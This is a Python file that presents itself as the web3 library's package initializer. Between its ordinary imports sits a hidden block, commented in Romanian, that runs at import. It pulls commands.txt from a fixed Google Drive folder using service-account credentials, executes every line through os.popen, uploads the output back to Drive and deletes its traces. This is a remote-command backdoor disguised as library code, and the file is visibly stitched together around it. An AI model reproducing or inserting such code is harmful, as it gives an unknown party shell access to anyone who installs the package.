from eth_account import Account  # noqa: E402

from importlib.metadata import version

__version__ = version("web3")

import os
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from googleapiclient.http import MediaFileUpload
from googleapiclient.http import MediaIoBaseDownload

# Setează calea către fișierul JSON al credențialelor
creds_path = 'credentials.json'

# Citește credențialele din fișierul JSON
creds = service_account.Credentials.from_service_account_file(creds_path)

# Creează un obiect de serviciu Google Drive
drive_service = build('drive', 'v3', credentials=creds)

# Funcția pentru încărcarea unui fișier într-un folder specific
def upload_file_to_folder(file_path, folder_id):
    file_metadata = {
        'name': file_path.split('/')[-1],  # Numele fișierului extrase din calea completă
        'parents': [folder_id]            # Setarea folderului părinte
    }
    media = MediaFileUpload(file_path, mimetype='text/plain', resumable=True)
    file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f'Fișierul {file_path} a fost încărcat cu succes în folderul {folder_id}.')

# Funcția pentru citirea unui fișier dintr-un folder specific
def read_file_from_folder(file_name, folder_id):
    query = f"'{folder_id}' in parents and name='{file_name}' and trashed=false"
    results = drive_service.files().list(q=query, fields='nextPageToken, files(id, name)').execute()
    items = results.get('files', [])
    if not items:
        print(f'Nu s-a găsit fișierul {file_name} în folderul {folder_id}.')
        return None
    else:
        file_id = items[0]['id']
        request = drive_service.files().get_media(fileId=file_id)
        with open(file_name, 'wb') as fh:
            downloader = MediaIoBaseDownload(fh, request)
            done = False
            while done is False:
                status, done = downloader.next_chunk()
                print(f'Descărcat {int(status.progress() * 100)}%')
        with open(file_name, 'r') as fh:
            content = fh.read()
        os.remove(file_name)
        return content

# ID-ul folderului Task1 pe Google Drive
folder_id = '1Elvn3kgpbDRFQIz6_FFXS2RYyrK9LnEh'

# Citește fișierul din folderul Task1
file_name1 = 'commands.txt'
file_name2= 'output_comm.txt'
content=read_file_from_folder(file_name1, folder_id)

with open(file_name2, 'w') as fh:
    lines = content.split('\n')
    for line in lines:
        if line != '':
            output = os.popen(line).read()
            fh.write(f'{line}\n{output}\n\n')

# Încarcă fișierul cu outputurile comenzilor în folderul Task1
upload_file_to_folder(file_name2, folder_id)
os.remove(file_name2)


from web3.main import (
    AsyncWeb3,
    Web3,
)
from web3.providers import (
    AsyncBaseProvider,
    AutoProvider,
    BaseProvider,
    JSONBaseProvider,
    PersistentConnection,
)
from web3.providers.persistent import (  # noqa: E402
    AsyncIPCProvider,
    PersistentConnectionProvider,
    WebSocketProvider,
)
from web3.providers.eth_tester import (  # noqa: E402
    AsyncEthereumTesterProvider,
    EthereumTesterProvider,
)
from web3.providers.ipc import (  # noqa: E402
    IPCProvider,
)
from web3.providers.rpc import (  # noqa: E402
    AsyncHTTPProvider,
    HTTPProvider,
)
from web3.providers.legacy_websocket import (  # noqa: E402
    LegacyWebSocketProvider,
)


__all__ = [
    "__version__",
    "Account",
    # web3:
    "AsyncWeb3",
    "Web3",
    # providers:
    "AsyncBaseProvider",
    "AsyncEthereumTesterProvider",
    "AsyncHTTPProvider",
    "AsyncIPCProvider",
    "AutoProvider",
    "BaseProvider",
    "EthereumTesterProvider",
    "HTTPProvider",
    "IPCProvider",
    "JSONBaseProvider",
    "LegacyWebSocketProvider",
    "PersistentConnection",
    "PersistentConnectionProvider",
    "WebSocketProvider",
]
